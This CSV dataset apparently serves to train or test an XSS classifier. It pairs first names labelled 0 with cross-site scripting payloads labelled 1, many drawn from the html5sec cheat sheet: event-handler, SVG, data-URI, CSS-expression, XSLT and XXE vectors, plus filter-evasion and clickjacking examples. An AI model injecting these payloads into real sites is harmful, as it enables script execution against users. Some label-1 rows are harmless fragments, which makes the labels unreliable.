input,label
"<div draggable=""true"" contenteditable>drag me</div><nextid ondragover=alert(1) contenteditable>drop here</nextid>",1
"<div draggable=""true"" contenteditable>drag me</div><nextid ondrop=alert(1) contenteditable>drop here</nextid>",1
"<div draggable=""true"" contenteditable>drag me</div><nobr ondragover=alert(1) contenteditable>drop here</nobr>",1
"<div draggable=""true"" contenteditable>drag me</div><nobr ondrop=alert(1) contenteditable>drop here</nobr>",1
"<div draggable=""true"" contenteditable>drag me</div><noembed ondragover=alert(1) contenteditable>drop here</noembed>",1
"<div draggable=""true"" contenteditable>drag me</div><noembed ondrop=alert(1) contenteditable>drop here</noembed>",1
"<div draggable=""true"" contenteditable>drag me</div><noframes ondragover=alert(1) contenteditable>drop here</noframes>",1
"<div draggable=""true"" contenteditable>drag me</div><noframes ondrop=alert(1) contenteditable>drop here</noframes>",1
"<div draggable=""true"" contenteditable>drag me</div><noscript ondragover=alert(1) contenteditable>drop here</noscript>",1
"<div draggable=""true"" contenteditable>drag me</div><noscript ondrop=alert(1) contenteditable>drop here</noscript>",1
"<div draggable=""true"" contenteditable>drag me</div><object ondragover=alert(1) contenteditable>drop here</object>",1
"<div draggable=""true"" contenteditable>drag me</div><object ondrop=alert(1) contenteditable>drop here</object>",1
"<div draggable=""true"" contenteditable>drag me</div><ol ondragover=alert(1) contenteditable>drop here</ol>",1
"<div draggable=""true"" contenteditable>drag me</div><ol ondrop=alert(1) contenteditable>drop here</ol>",1
"<div draggable=""true"" contenteditable>drag me</div><optgroup ondragover=alert(1) contenteditable>drop here</optgroup>",1
"<div draggable=""true"" contenteditable>drag me</div><optgroup ondrop=alert(1) contenteditable>drop here</optgroup>",1
"<div draggable=""true"" contenteditable>drag me</div><option ondragover=alert(1) contenteditable>drop here</option>",1
Gianni,0
Jesse,0
Petronella,0
Jonah,0
Morrie,0
Benn,0
Hunfredo,0
Demott,0
Sybil,0
Serena,0
Arleta,0
Jennica,0
Etan,0
Helen-elizabeth,0
Norina,0
Heddi,0
Yankee,0
Mozelle,0
Catie,0
Leesa,0
Remington,0
Worthy,0
Jakie,0
Loretta,0
Tallie,0
Courtney,0
"<![><img src=""]><img src=x onerror=alert(39)//"">",1
"<!-- IE9+, FF4+, Opera 11.60+, Safari 4.0.4+, GC7+  -->",1
"<svg><![CDATA[><image xlink:href=""]]><img src=xx:x onerror=alert(2)//""></svg>//[""'`-->]]>]</div>",1
"<div id=""40""><style><img src=""</style><img src=x onerror=alert(40)//"">//[""'`-->]]>]</div>",1
"<div id=""41""><li style=list-style:url() onerror=alert(41)></li>",1
"<div style=content:url(data:image/svg+xml,%3Csvg/%3E);visibility:hidden onload=alert(41)></div>//[""'`-->]]>]</div>",1
"<div id=""42""><head><base href=""javascript://""/></head><body><a href=""/. /,alert(42)//#"">XXX</a></body>//[""'`-->]]>]</div>",1
"<div id=""43""><?xml version=""1.0"" standalone=""no""?>",1
"<html xmlns=""http://www.w3.org/1999/xhtml"">",1
"<head><style type=""text/css"">@font-face {font-family: y; src: url(""font.svg#x"") format(""svg"");} body {font: 100px ""y"";}</style></head>",1
Griswold,0
Fredra,0
Chloe,0
Royal,0
Muffin,0
Ryon,0
Sheba,0
<body ontouchstart=alert(1)>,1
<body ontouchend=alert(1)>,1
<body ontouchmove=alert(1)>,1
Benton,0
Lynnea,0
Austin,0
Eldon,0
Reynolds,0
Trever,0
Carolina,0
Malissa,0
Sherlock,0
Ruggiero,0
Lisbeth,0
Lonni,0
Demetris,0
Kermit,0
Reynard,0
Catherin,0
<body>Hello</body>,1
"</html>//[""'`-->]]>]</div>",1
"<div id=""44""><style>*[{}@import'test.css?]{color: green;}</style>X//[""'`-->]]>]</div><div id=""45""><div style=""font-family:'foo[a];color:red;';"">XXX</div>//[""'`-->]]>]</div><div id=""46""><div style=""font-family:foo}color=red;"">XXX</div>//[""'`-->]]>]</div><div id=""47""><svg xmlns=""http://www.w3.org/2000/svg""><script>alert(47)</script></svg>//[""'`-->]]>]</div><div id=""48""><SCRIPT FOR=document EVENT=onreadystatechange>alert(48)</SCRIPT>//[""'`-->]]>]</div><div id=""49""><OBJECT CLASSID=""clsid:333C7BC4-460F-11D0-BC04-0080C7055A83""><PARAM NAME=""DataURL"" VALUE=""javascript:alert(49)""></OBJECT>//[""'`-->]]>]</div><div id=""50""><object data=""data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==""></object>//[""'`-->]]>]</div><div id=""51""><embed src=""data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==""></embed>//[""'`-->]]>]</div><div id=""52""><x style=""behavior:url(test.sct)"">//[""'`-->]]>]</div>",1
"<div id=""53""><xml id=""xss"" src=""test.htc""></xml>",1
"<label dataformatas=""html"" datasrc=""#xss"" datafld=""payload""></label>//[""'`-->]]>]</div>",1
Arnoldo,0
Phillipp,0
Arne,0
Jakob,0
Drake,0
Beatrix,0
Chrissy,0
Tobye,0
Felita,0
Hamel,0
Meryl,0
Venita,0
Bernardo,0
Fancy,0
Levey,0
Jami,0
Honoria,0
Kacy,0
Jenda,0
"<form><button formaction=""javascript:alert(1)"">",1
<scr<script>ipt>alert('XSS')</scr<script>ipt>,1
><script>alert('XSS')</script>,1
"><script>alert(String.fromCharCode(88,83,83))</script>",1
<script>\u0061lert('22')</script>,1
Rolph,0
Rosabella,0
Shaina,0
Harriett,0
Karlis,0
Darcey,0
Georgina,0
Horst,0
Vasili,0
Rozalin,0
Nelie,0
Penny,0
Skippie,0
Bili,0
Poul,0
Isabella,0
Terese,0
Eba,0
"<div id=""118""><div draggable=""true"" ondragstart=""event.dataTransfer.setData('text/plain','malicious code');""><h1>Drop me</h1></div>",1
"<iframe src=""http://www.example.org/dropHere.html""></iframe>//[""'`-->]]>]</div>",1
"<div id=""119""><iframe src=""view-source:http://www.example.org/"" frameborder=""0"" style=""width:400px;height:180px""></iframe>",1
"<textarea type=""text"" cols=""50"" rows=""10""></textarea>//[""'`-->]]>]</div>",1
"<div id=""120""><script>function makePopups(){for (i=1;i<6;i++) {window.open('popup.html','spam'+i,'width=50,height=50');}}</script>",1
"<body><a href=""#"" onclick=""makePopups()"">Spam</a>//[""'`-->]]>]</div>",1
"<div id=""121""><html xmlns=""http://www.w3.org/1999/xhtml",1
"xmlns:svg=""http://www.w3.org/2000/svg"">",1
"<body style=""background:gray"">",1
"<iframe src=""http://example.com/"" style=""width:800px; height:350px; border:none; mask: url(#maskForClickjacking);""/>",1
"<svg:svg><svg:mask id=""maskForClickjacking"" maskUnits=""objectBoundingBox"" maskContentUnits=""objectBoundingBox""><svg:rect x=""0.0"" y=""0.0"" width=""0.373"" height=""0.3"" fill=""white""/><svg:circle cx=""0.45"" cy=""0.7"" r=""0.075"" fill=""white""/></svg:mask></svg:svg></body>",1
Kev,0
Dorie,0
Jandy,0
Katya,0
Marvin,0
Nannette,0
Piper,0
Eb,0
Calypso,0
Vincenz,0
Stanfield,0
Verine,0
Daffi,0
Bartolemo,0
Maurits,0
Tybi,0
Ofelia,0
Hastie,0
Abdel,0
Elwira,0
Masha,0
Steffi,0
Claudius,0
Hubie,0
Bendicty,0
Grover,0
Toby,0
Beulah,0
Linc,0
Rock,0
Aldo,0
"<! foo=""[[[x]]""><x foo=""]foo><script>alert(91)</script>"">",1
"<% foo><x foo=""%><script>alert(91)</script>"">//[""'`-->]]>]</div>",1
"<div id=""92""><div style=""background:url(http://foo.f/f oo/;color:red/*/foo.jpg);"">X</div>//[""'`-->]]>]</div><div id=""93""><div style=""list-style:url(http://foo.f)\20url(javascript:alert(93));"">X</div>//[""'`-->]]>]</div>",1
"<div id=""94""><svg xmlns=""http://www.w3.org/2000/svg"">",1
"<handler xmlns:ev=""http://www.w3.org/2001/xml-events"" ev:event=""load"">alert(94)</handler>",1
Alta,0
Linell,0
Karly,0
Andrus,0
Harrie,0
Laureen,0
Marigold,0
Alisha,0
Faith,0
Maddie,0
Margit,0
Haven,0
Moria,0
Gelya,0
Gracie,0
"<feImage><set attributeName=""xlink:href"" to=""data:image/svg+xml;charset=utf-8;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ%2BYWxlcnQoMSk8L3NjcmlwdD48L3N2Zz4NCg%3D%3D""/></feImage>",1
"<div id=""96""><iframe src=mhtml:http://html5sec.org/test.html!xss.html></iframe>",1
"<iframe src=mhtml:http://html5sec.org/test.gif!xss.html></iframe>//[""'`-->]]>]</div>",1
"<div id=""97""><!-- IE 5-9 -->",1
"<div id=d><x xmlns=""><iframe onload=alert(97)""></div>",1
<script>d.innerHTML+='';</script>,1
<!-- IE 10 in IE5-9 Standards mode -->,1
"<div id=d><x xmlns='""><iframe onload=alert(2)//'></div>",1
"<script>d.innerHTML+='';</script>//[""'`-->]]>]</div>",1
Rodrigo,0
Cleve,0
Arnuad,0
Rowen,0
Sol,0
Julianna,0
Benjy,0
Valenka,0
Abelard,0
Frazier,0
Dorotea,0
Fair,0
Guthry,0
Wash,0
Aurora,0
Clara,0
Eleanore,0
Briny,0
Ameline,0
Loutitia,0
Carissa,0
Marcellus,0
Clarine,0
Colette,0
Keri,0
Ruby,0
Morly,0
Jeffry,0
Edward,0
Diandra,0
Abraham,0
Glendon,0
Link,0
Arther,0
Peggie,0
Matilde,0
Wernher,0
"<div id=""95""><svg xmlns=""http://www.w3.org/2000/svg"" xmlns:xlink=""http://www.w3.org/1999/xlink"">",1
"<div id=""105""><iframe src=""data:image/svg-xml,%1F%8B%08%00%00%00%00%00%02%03%B3)N.%CA%2C(Q%A8%C8%CD%C9%2B%B6U%CA())%B0%D2%D7%2F%2F%2F%D7%2B7%D6%CB%2FJ%D77%B4%B4%B4%D4%AF%C8(%C9%CDQ%B2K%CCI-*%D10%D4%B4%D1%87%E8%B2%03""></iframe>//[""'`-->]]>]</div><div id=""106""><img src onerror /"" '""= alt=alert(106)//"">//[""'`-->]]>]</div><div id=""107""><title onpropertychange=alert(107)></title><title title=></title>//[""'`-->]]>]</div>",1
"<div id=""108""><!-- IE 5-8 standards mode -->",1
"<a href=http://foo.bar/#x=`y></a><img alt=""`><img src=xx:x onerror=alert(108)></a>"">",1
<!-- IE 5-9 standards mode -->,1
"<!a foo=x=`y><img alt=""`><img src=xx:x onerror=alert(2)//"">",1
"<?a foo=x=`y><img alt=""`><img src=xx:x onerror=alert(3)//"">//[""'`-->]]>]</div>",1
"<div id=""109""><svg xmlns=""http://www.w3.org/2000/svg"">",1
"<a id=""x""><rect fill=""white"" width=""1000"" height=""1000""/></a>",1
"<rect  fill=""white"" style=""clip-path:url(test3.svg#a);fill:url(#b);filter:url(#c);marker:url(#d);mask:url(#e);stroke:url(#f);""/>",1
Falkner,0
Melisandra,0
Conan,0
Libby,0
Bram,0
Mayor,0
Haleigh,0
Fonzie,0
Jere,0
Sawyere,0
Bernete,0
Willamina,0
Ernest,0
Joaquin,0
Debor,0
Flore,0
Pam,0
Mendie,0
Alleyn,0
Irwinn,0
Archibaldo,0
Dud,0
Rockie,0
Bailie,0
Bobbie,0
Ellis,0
Junia,0
<div style=content:url(test2.svg)></div>,1
<!-- Up to Opera 11.64 - see link below -->,1
<!-- Up to Opera 12.x -->,1
"<div style=""background:url(test5.svg)"">PRESS ENTER</div>//[""'`-->]]>]</div>",1
"<div id=""91"">[A]",1
"<? foo=""><script>alert(91)</script>"">",1
"<! foo=""><script>alert(91)</script>"">",1
"</ foo=""><script>alert(91)</script>"">",1
"<? foo=""><x foo='?><script>alert(91)</script>'>"">",1
Gerik,0
Stephannie,0
Denyse,0
Darwin,0
Portia,0
Dolley,0
Ric,0
Erich,0
Bennie,0
Zandra,0
Emory,0
Sherilyn,0
Reilly,0
Romy,0
Robinett,0
Cora,0
Clement,0
Atalanta,0
Zenia,0
Anastassia,0
Janeen,0
Corey,0
Inesita,0
Jasmina,0
Clarissa,0
"<div id=""87""><svg xmlns=""http://www.w3.org/2000/svg"">",1
"<a xmlns:xlink=""http://www.w3.org/1999/xlink"" xlink:href=""javascript:alert(87)""><rect width=""1000"" height=""1000"" fill=""white""/></a>",1
"<div id=""88""><svg xmlns=""http://www.w3.org/2000/svg"" xmlns:xlink=""http://www.w3.org/1999/xlink"">",1
"<animation xlink:href=""javascript:alert(88)""/>",1
"<animation xlink:href=""data:text/xml,%3Csvg xmlns='http://www.w3.org/2000/svg' onload='alert(88)'%3E%3C/svg%3E""/>",1
Celestina,0
Christy,0
Blanche,0
Vic,0
Ulrikaumeko,0
Andris,0
Chris,0
Dean,0
Octavia,0
Milton,0
Katleen,0
Dur,0
Nadeen,0
Mason,0
Alejandro,0
Zora,0
Dallas,0
Bud,0
Johnath,0
Ekaterina,0
Desdemona,0
Shell,0
"<image xlink:href=""data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' onload='alert(88)'%3E%3C/svg%3E""/>",1
"<foreignObject xlink:href=""javascript:alert(88)""/>",1
"<foreignObject xlink:href=""data:text/xml,%3Cscript xmlns='http://www.w3.org/1999/xhtml'%3Ealert(88)%3C/script%3E""/>",1
"<div id=""89""><svg xmlns=""http://www.w3.org/2000/svg"">",1
"<set attributeName=""onmouseover"" to=""alert(89)""/>",1
"<animate attributeName=""onunload"" to=""alert(89)""/>",1
"<div id=""90""><!-- Up to Opera 10.63 -->",1
Claire,0
Jessica,0
Susanetta,0
Lauren,0
Muhammad,0
Sherm,0
Vincent,0
Bevin,0
Maxy,0
Bryana,0
Knox,0
Frederica,0
Florance,0
Julio,0
Angelica,0
Kacey,0
Enrica,0
Lucia,0
Leslie,0
Siouxie,0
Derward,0
Verene,0
Adria,0
Clotilda,0
Richmond,0
Gaultiero,0
Christoforo,0
Daphna,0
Fredi,0
Gardy,0
Powell,0
Laurice,0
Adolphe,0
Ara,0
Brockie,0
Dorena,0
Merl,0
Caron,0
Osmond,0
Aylmar,0
Hector,0
"<?xml-stylesheet type=""text/xsl"" href=""data:,%3Cxsl:transform version='1.0' xmlns:xsl='http://www.w3.org/1999/XSL/Transform' id='xss'%3E%3Cxsl:output method='html'/%3E%3Cxsl:template match='/'%3E%3Cscript%3Ealert(66)%3C/script%3E%3C/xsl:template%3E%3C/xsl:transform%3E""?>",1
"<root/>//[""'`-->]]>]</div>",1
"<div id=""67""><!DOCTYPE x [   <!ATTLIST img xmlns CDATA ""http://www.w3.org/1999/xhtml"" src CDATA ""xx:x""onerror CDATA ""alert(67)""onload CDATA ""alert(2)"">]><img />//[""'`-->]]>]</div>",1
"<div id=""68""><doc xmlns:xlink=""http://www.w3.org/1999/xlink"" xmlns:html=""http://www.w3.org/1999/xhtml"">   <html:style /><x xlink:href=""javascript:alert(68)"" xlink:type=""simple"">XXX</x></doc>//[""'`-->]]>]</div>",1
"<div id=""84""><x xmlns:ev=""http://www.w3.org/2001/xml-events"" ev:event=""load"" ev:handler=""javascript:alert(84)//#x""/>//[""'`-->]]>]</div><div id=""85""><x xmlns:ev=""http://www.w3.org/2001/xml-events"" ev:event=""load"" ev:handler=""test.evt#x""/>//[""'`-->]]>]</div><div id=""86""><body oninput=alert(86)><input autofocus>//[""'`-->]]>]</div>",1
Renelle,0
Hobey,0
Norry,0
Susanna,0
Mort,0
Peter,0
Alfreda,0
Hewie,0
Evelyn,0
Isador,0
Marlow,0
Kendra,0
Siegfried,0
Allianora,0
Barbaraanne,0
Suellen,0
Kennett,0
Kiersten,0
Cristian,0
"<div id=""62""><!-- IE 6-8 -->",1
"<x '=""foo""><x foo='><img src=x onerror=alert(62)//'>",1
<!-- IE 6-9 -->,1
"<! '=""foo""><x foo='><img src=x onerror=alert(2)//'>",1
"<? '=""foo""><x foo='><img src=x onerror=alert(3)//'>//[""'`-->]]>]</div>",1
"<div id=""63""><embed src=""javascript:alert(63)""></embed> // O10.10↓, OM10.0↓, GC6↓, FF",1
Gabi,0
Vilhelmina,0
Kailey,0
Suzanna,0
Clementine,0
Gregg,0
Clemmy,0
Bancroft,0
Nedi,0
Carlos,0
Camey,0
Ardyth,0
Helaine,0
Joshia,0
Kathy,0
"<div draggable=""true"" contenteditable>drag me</div><iframe ondragover=alert(1) contenteditable>drop here</iframe>",1
"<div draggable=""true"" contenteditable>drag me</div><iframe ondrop=alert(1) contenteditable>drop here</iframe>",1
"<div draggable=""true"" contenteditable>drag me</div><image ondragover=alert(1) contenteditable>drop here</image>",1
"<div draggable=""true"" contenteditable>drag me</div><image ondrop=alert(1) contenteditable>drop here</image>",1
"<div draggable=""true"" contenteditable>drag me</div><img ondragover=alert(1) contenteditable>drop here</img>",1
"<div draggable=""true"" contenteditable>drag me</div><img ondrop=alert(1) contenteditable>drop here</img>",1
"<div draggable=""true"" contenteditable>drag me</div><input ondragover=alert(1) contenteditable>drop here</input>",1
"<div draggable=""true"" contenteditable>drag me</div><input ondrop=alert(1) contenteditable>drop here</input>",1
"<div draggable=""true"" contenteditable>drag me</div><ins ondragover=alert(1) contenteditable>drop here</ins>",1
"<div draggable=""true"" contenteditable>drag me</div><ins ondrop=alert(1) contenteditable>drop here</ins>",1
"<div draggable=""true"" contenteditable>drag me</div><isindex ondragover=alert(1) contenteditable>drop here</isindex>",1
"<div draggable=""true"" contenteditable>drag me</div><isindex ondrop=alert(1) contenteditable>drop here</isindex>",1
"<div draggable=""true"" contenteditable>drag me</div><kbd ondragover=alert(1) contenteditable>drop here</kbd>",1
"<div draggable=""true"" contenteditable>drag me</div><kbd ondrop=alert(1) contenteditable>drop here</kbd>",1
"<div draggable=""true"" contenteditable>drag me</div><keygen ondragover=alert(1) contenteditable>drop here</keygen>",1
"<div draggable=""true"" contenteditable>drag me</div><keygen ondrop=alert(1) contenteditable>drop here</keygen>",1
"<div draggable=""true"" contenteditable>drag me</div><label ondragover=alert(1) contenteditable>drop here</label>",1
"<div draggable=""true"" contenteditable>drag me</div><label ondrop=alert(1) contenteditable>drop here</label>",1
"<div draggable=""true"" contenteditable>drag me</div><legend ondragover=alert(1) contenteditable>drop here</legend>",1
Marilee,0
Johna,0
Gratia,0
Wyatt,0
Sayer,0
Broddy,0
Tome,0
Rafi,0
Reinaldo,0
Pat,0
Nariko,0
Joyann,0
Orel,0
Constantine,0
Raynell,0
Lazarus,0
Leora,0
Mandi,0
Finn,0
Cornell,0
"<img src=""javascript:alert(2)"">",1
"<image src=""javascript:alert(2)""> // IE6, O10.10↓, OM10.0↓",1
"<script src=""javascript:alert(3)""></script> // IE6, O11.01↓, OM10.1↓//[""'`-->]]>]</div>",1
"<div id=""64""><!DOCTYPE x[<!ENTITY x SYSTEM ""http://html5sec.org/test.xxe"">]><y>&x;</y>//[""'`-->]]>]</div><div id=""65""><svg onload=""javascript:alert(65)"" xmlns=""http://www.w3.org/2000/svg""></svg>//[""'`-->]]>]</div>",1
"<div id=""66""><?xml version=""1.0""?>",1
Starlene,0
Avery,0
Harv,0
Dukie,0
Korry,0
Win,0
Ricardo,0
Storm,0
Paddy,0
Austine,0
Ban,0
Lexie,0
Delcina,0
"<div id=""54""><script>[{'a':Object.prototype.__defineSetter__('b',function(){alert(arguments[0])}),'b':['secret']}]</script>//[""'`-->]]>]</div><div id=""55""><video><source onerror=""alert(55)"">//[""'`-->]]>]</div><div id=""56""><video onerror=""alert(56)""><source></source></video>//[""'`-->]]>]</div><div id=""57""><b <script>alert(57)//</script>0</script></b>//[""'`-->]]>]</div><div id=""58""><b><script<b></b><alert(58)</script </b></b>//[""'`-->]]>]</div><div id=""59""><div id=""div1""><input value=""``onmouseover=alert(59)""></div> <div id=""div2""></div><script>document.getElementById(""div2"").innerHTML = document.getElementById(""div1"").innerHTML;</script>//[""'`-->]]>]</div><div id=""60""><div style=""[a]color[b]:[c]red"">XXX</div>//[""'`-->]]>]</div>",1
"<div id=""61""><div  style=""\63&#9\06f&#10\0006c&#12\00006F&#13\R:\000072 Ed;color\0\bla:yellow\0\bla;col\0\00 \&#xA0or:blue;"">XXX</div>//[""'`-->]]>]</div>",1
Vin,0
Berny,0
Emery,0
Rey,0
Robby,0
Nada,0
Spenser,0
Kata,0
Tad,0
Eachelle,0
Alexis,0
Robbie,0
Gal,0
Marni,0
Jonas,0
Celestia,0
Urson,0
Torry,0
Farris,0
Caroline,0
Leodora,0
Sansone,0
Tania,0
Malvin,0
Greggory,0
Derby,0
Roselin,0
Hew,0
Vickie,0
Auguste,0
Eleanora,0
Aguste,0
Judah,0
Town,0
Sibelle,0
Emmalynn,0
Hedy,0
Egbert,0
Somerset,0
Dorothea,0
Pierette,0
Wileen,0
Isahella,0
Emlyn,0
Erny,0
Earvin,0
"<div id=""69""><card xmlns=""http://www.wapforum.org/2001/wml""><onevent type=""ontimer""><go href=""javascript:alert(69)""/></onevent><timer value=""1""/></card>//[""'`-->]]>]</div><div id=""70""><div style=width:1px;filter:glow onfilterchange=alert(70)>x</div>//[""'`-->]]>]</div><div id=""71""><// style=x:expression\28alert(71)\29>//[""'`-->]]>]</div><div id=""72""><form><button formaction=""javascript:alert(72)"">X</button>//[""'`-->]]>]</div><div id=""73""><event-source src=""event.php"" onload=""alert(73)"">//[""'`-->]]>]</div><div id=""74""><a href=""javascript:alert(74)""><event-source src=""data:application/x-dom-event-stream,Event:click%0Adata:XXX%0A%0A"" /></a>//[""'`-->]]>]</div><div id=""75""><script<{alert(75)}/></script </>//[""'`-->]]>]</div><div id=""76""><?xml-stylesheet type=""text/css""?><!DOCTYPE x SYSTEM ""test.dtd""><x>&x;</x>//[""'`-->]]>]</div><div id=""77""><?xml-stylesheet type=""text/css""?><root style=""x:expression(alert(77))""/>//[""'`-->]]>]</div><div id=""78""><?xml-stylesheet type=""text/xsl"" href=""#""?><img xmlns=""x-schema:test.xdr""/>//[""'`-->]]>]</div><div id=""79""><object allowscriptaccess=""always"" data=""test.swf""></object>//[""'`-->]]>]</div><div id=""80""><style>*{x:ｅｘｐｒｅｓｓｉｏｎ(alert(80))}</style>//[""'`-->]]>]</div><div id=""81""><x xmlns:xlink=""http://www.w3.org/1999/xlink"" xlink:actuate=""onLoad"" xlink:href=""javascript:alert(81)"" xlink:type=""simple""/>//[""'`-->]]>]</div><div id=""82""><?xml-stylesheet type=""text/css"" href=""data:,*%7bx:expression(write(2));%7d""?>//[""'`-->]]>]</div>",1
"<div id=""83""><x:template xmlns:x=""http://www.wapforum.org/2001/wml""  x:ontimer=""$(x:unesc)j$(y:escape)a$(z:noecs)v$(x)a$(y)s$(z)cript$x:alert(83)""><x:timer value=""1""/></x:template>//[""'`-->]]>]</div>",1
Dennis,0
Raina,0
Lawry,0
